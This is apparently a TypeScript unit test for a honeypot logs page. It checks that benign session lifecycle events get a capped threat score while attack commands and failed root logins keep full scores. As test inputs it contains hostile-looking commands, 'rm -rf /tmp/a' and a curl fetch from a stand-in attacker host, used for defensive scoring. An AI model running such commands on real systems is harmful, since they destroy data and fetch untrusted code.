import { describe, expect, test } from 'bun:test';
import * as fs from 'node:fs';
import * as path from 'node:path';
import {
  BENIGN_LIFECYCLE_SCORE_CAP,
  calibrateEventThreatScore,
  isBenignLifecycleEvent,
} from '../utils/eventScoring';

describe('QA-012: HoneypotLogsPage Benign Lifecycle Threat Score Calibration', () => {
  test('clamps benign disconnect/session close/handshake telemetry to low baseline score', () => {
    expect(isBenignLifecycleEvent('session_end', {})).toBe(true);
    expect(isBenignLifecycleEvent('cowrie.session.closed', {})).toBe(true);
    expect(calibrateEventThreatScore('session_end', 100, {})).toBe(BENIGN_LIFECYCLE_SCORE_CAP);
    expect(calibrateEventThreatScore('session_start', 85, {})).toBe(BENIGN_LIFECYCLE_SCORE_CAP);
    expect(calibrateEventThreatScore('client_info', 0, {})).toBe(0);
    expect(calibrateEventThreatScore('session_end', undefined, {})).toBeUndefined();
  });

  test('preserves full threat score for active attack commands and authentication events', () => {
    expect(calibrateEventThreatScore('command_execution', 100, { command: 'rm -rf /tmp/a' })).toBe(100);
    expect(calibrateEventThreatScore('ssh_login_failed', 75, { username: 'root' })).toBe(75);
    expect(calibrateEventThreatScore('session_end', 95, { command: 'curl attacker.example/x.sh' })).toBe(95);
  });

  test('HoneypotLogsPage routes normalized events through calibrateEventThreatScore', () => {
    const pageSrc = fs.readFileSync(path.resolve(__dirname, '../pages/HoneypotLogsPage.tsx'), 'utf8');
    expect(pageSrc).toContain('calibrateEventThreatScore');
  });
});
